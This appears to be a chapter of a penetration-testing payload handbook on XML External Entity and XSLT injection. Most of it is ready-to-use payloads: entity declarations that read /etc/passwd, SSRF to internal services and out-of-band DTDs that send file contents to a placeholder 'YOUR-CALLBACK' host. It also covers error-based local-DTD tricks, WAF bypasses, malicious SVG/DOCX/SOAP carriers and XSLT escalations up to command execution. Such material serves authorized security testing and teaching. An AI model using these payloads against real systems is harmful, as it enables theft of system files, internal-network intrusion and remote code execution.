# Ch06 — XML External Entity (XXE) & XML Payloads

> Entity/DTD payload families: file read, SSRF, blind OOB channels, error-based (local/remote DTD), XInclude, encoding bypasses, SOAP/office formats.
> Sources: `XXE Injection/` (README + SVG/SOAP/DOCX/XLSX sub-files), `XSLT Injection/` cross-ref.

**Route here when**: the server parses XML — `Content-Type: application/xml`, SOAP endpoints, file uploads of `.xml`/`.svg`/`.docx`/`.xlsx`/`.xslx` (Office Open XML), SAML responses, RSS/Atom feeds.

**Safety**: file-read PoCs use `/etc/hostname` or `win.ini`. Never use billion-laughs/parameter-laughs DoS payloads on production.

## Detection — entity substitution

Internal general entity (parse check, harmless):

```xml
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

Signal: output contains `John Doe` → entities resolve → try `SYSTEM` external entities. Set `Content-Type: application/xml` if the endpoint guesses by header.

Entity types: general `&name;` usable in document content; parameter `%name;` usable only inside the DTD — the distinction drives which blind techniques work.

## Classic file read

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

Windows target: `file:///c:/boot.ini`, `file:///c:/windows/win.ini`. `SYSTEM` and `PUBLIC` are near-synonyms — `<!ENTITY xxe PUBLIC "Any TEXT" "URL">`.

### PHP wrapper inside XXE (PHP-parsing targets)

```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts><contact><name>Jean &xxe; Dupont</name></contact></contacts>
```

The result arrives base64 — decode offline. `expect://`, `php://input`, `phar://` also reachable (see ch07).

### XInclude — when you can't inject `<!DOCTYPE>`

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

Use when input lands inside an existing document body (SAML assertion fields, SOAP parameters) and DTD injection is impossible.

## XXE → SSRF

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" > ]>
<foo>&xxe;</foo>
```

The XML parser fetches the URL — internal-network SSRF. Also try the metadata endpoints from ch05.

## Blind XXE — no output in response

**Remote-entity hit** (proves parsing only):

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [ <!ENTITY % ext SYSTEM "http://YOUR-CALLBACK/x"> %ext; ]>
<r></r>
```

**OOB data return** — parameter entities + external DTD:

Request:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://YOUR-CALLBACK/parameterEntity_oob.dtd">
<data>&send;</data>
```

`parameterEntity_oob.dtd` hosted on your listener:

```xml
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://YOUR-CALLBACK/?%file;'>">
%all;
```

Variant with PHP filter (encodes so newlines survive the URL):

```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY readout SYSTEM 'http://YOUR-CALLBACK/dtd.xml?%data;'>">
```

## Error-based XXE — no OOB channel available

Force the file content into a parser error message.

**Remote DTD**:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://YOUR-CALLBACK/ext.dtd">
    %ext;
]>
<message></message>
```

`ext.dtd`:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Mechanics: `%file;` reads the file; `%eval;` defines `error` entity pointing at a nonexistent path containing the file content; `%error;` triggers a file-not-found error that embeds the content. `&#x25;` = `%` inside entity definitions.

**Local DTD** (no outbound connectivity at all — reuse an on-disk DTD with an injectable entity):

Linux: `/usr/share/xml/fontconfig/fonts.dtd` (has injectable `%constant`), `/usr/share/yelp/dtd/docbookx.dtd`, `/usr/share/xml/svg/svg1*.dtd`.

```xml
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
    <!ENTITY % constant 'aaa)>
            <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
            <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///x/&#x25;file;&#x27;>">
            &#x25;eval;
            &#x25;error;
            <!ELEMENT aa (bb'>
    %local_dtd;
]>
<message>Text</message>
```

Windows equivalent target: `file:///C:\Windows\System32\wbem\xml\cim20.dtd` with `%SuperClass` injection (see upstream `xxe-windows` payloads). Discovery: `locate .dtd` on the target, or GoSecure/dtd-finder list.

## Encoding / WAF bypasses

- UTF-16 / UTF-7 encoding of the whole document — some WAFs only regex UTF-8.
- `<?xml version="1.0" encoding="UTF-16"?>` with UTF-16-encoded body.
- Surrogate-pair / overlong encodings on the `<!ENTITY` keyword.
- Split keywords across parameter-entity tricks (`%p` defined pieces) when `DOCTYPE`/`SYSTEM` are blacklisted.
- XML inside JSON: `{"xml":"<?xml ...>"}` when the endpoint is JSON-wrapped.

## Carrier formats

- **SVG upload**: embed `<!ENTITY xxe SYSTEM "file:///etc/passwd">` inside `<text>` — file content renders as image text (also pairs with ch01 SVG XSS).
- **DOCX/XLSX**: it's a zip of XML — inject entities into `word/document.xml`/`xl/sharedStrings.xml` and re-zip.
- **SOAP**: entities inside `<soapenv:Body>` parameters — classic on SOAP web services.
- **SAML**: entities in assertion attributes can alter post-canonicalization values (see ch13 signature-wrapping).

## XSLT injection (sibling class)

If the endpoint transforms XML/XSLT (not just parses):

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="system-property('xsl:vendor')"/>   <!-- fingerprint -->
    <xsl:copy-of select="document('/etc/passwd')"/>          <!-- file read / SSRF via document() -->
    <xsl:copy-of select="document('http://internal:25/')"/>
  </xsl:template>
</xsl:stylesheet>
```

Escalations: EXSLT `exploit:document` file write; PHP XSLT `php:function('readfile','index.php')`, `php:function('scandir','.')`, `php:function('file_put_contents',...)`; Java Xalan `rt:exec(rt:getRuntime(),'id')`; .NET `msxsl:script` blocks. XXE inside the XSLT doc itself also applies.
